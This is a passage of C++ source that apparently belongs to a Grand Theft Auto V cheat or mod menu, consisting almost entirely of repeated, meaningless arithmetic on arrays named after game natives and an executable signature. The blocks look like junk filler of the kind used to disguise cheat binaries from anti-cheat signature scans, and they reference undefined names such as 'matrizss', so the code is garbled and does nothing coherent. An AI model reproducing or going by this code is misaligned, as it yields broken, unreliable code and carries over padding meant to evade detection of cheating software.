				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::INIFile::Float::GravarFloat(0, buffer, "PosY");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
